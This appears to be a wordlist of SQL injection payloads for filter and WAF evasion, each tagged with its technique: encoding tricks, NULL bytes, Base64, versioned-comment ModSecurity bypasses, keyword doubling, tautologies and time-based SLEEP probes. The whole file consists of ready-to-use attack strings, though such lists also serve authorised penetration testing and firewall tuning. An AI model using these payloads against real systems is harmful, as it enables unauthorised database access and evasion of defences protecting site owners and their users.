' or 2=2--@SQLi 2=2
(1)or(1)=(1)@SQLi Brackets
1 AND %EF%BC%871%EF%BC%87=%EF%BC%871@SQLi apostrophe 2 UTF-8
1 AND %00%271%00%27=%00%271@SQLi apostrophe 2 illegal double unicode
1 AND 1=1%00@SQLi Appends encoded NULL byte
MScgQU5EIFNMRUVQKDUpIw==@SQLi Base64
1 AND A NOT BETWEEN 0 AND B--@SQLi Not between
1 AND A BETWEEN B AND B--@SQLi Between
SELECT%09id FROM%09users WHERE%09id LIKE 1@SQLi valid random blank character after SQL statement
%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545@SQLi Double url-encodes
%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45@SQLi Url-encodes
%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045@SQLi Unicode-url-encodes
LIMIT 3 OFFSET 2@SQLi comma 2 OFFSET
MID(VERSION() FROM 1 FOR 1)@SQLi comma 2 FROM FOR
CONCAT_WS(MID(CHAR(0),0,0),1,2)@SQLi CONCAT 2 CONCAT_WS
SELECT * FROM users WHERE id LIKE 1@SQLi Equal 2 LIKE
1\\\\" AND SLEEP(5)#@SQLi Escape quotes
1 AND GREATEST(A,B+1)=A@SQLi GREATEST
/*!0UNION/*!0ALL/*!0SELECT@SQLi /*! statement
1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;@SQLi HTML Encode
IF(ISNULL(1),2,1)@SQLi IFNULL 2 IFISNULL
SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES@SQLi informationschema comment
select table_name from@SQLi lowercase
1 /*!30874AND 2>1*/--@SQLi bypass ModSec versioned
1 /*!00000AND 2>1*/--@SQLi bypass ModSec zero-versioned
1    UNION     SELECT   foobar@SQLi Multiple spaces
1 UNIOUNIONN SELESELECTCT 2--@SQLi Non Recursive
